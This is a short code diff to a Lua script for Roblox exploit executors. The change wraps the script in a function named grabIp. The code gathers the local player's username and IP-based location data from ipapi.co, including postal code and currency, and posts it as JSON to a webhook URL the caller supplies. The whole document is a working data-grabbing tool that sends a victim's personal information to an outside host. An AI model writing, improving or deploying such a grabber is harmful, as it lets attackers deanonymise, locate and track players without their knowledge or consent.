@@ -1,4 +1,6 @@
-local url = _G.WebhookUrl
+local function grabIp(Webhook)
+    
+local url = Webhook
 
 
 local username = game.Players.LocalPlayer.Name
@@ -42,8 +44,6 @@ local currency = game:HttpGet("https://ipapi.co/currency")
 
 local zip = game:HttpGet("https://ipapi.co/postal")
 
-
-
 local data = {
    ["content"] = "",
    ["embeds"] = {
@@ -65,3 +65,4 @@ request = http_request or request or HttpPost or syn.request
 local send = {Url = url, Body = game:GetService("HttpService"):JSONEncode(data), Method = "POST", Headers = {["content-type"] = "application/json"}}
 
 request(send)
+end
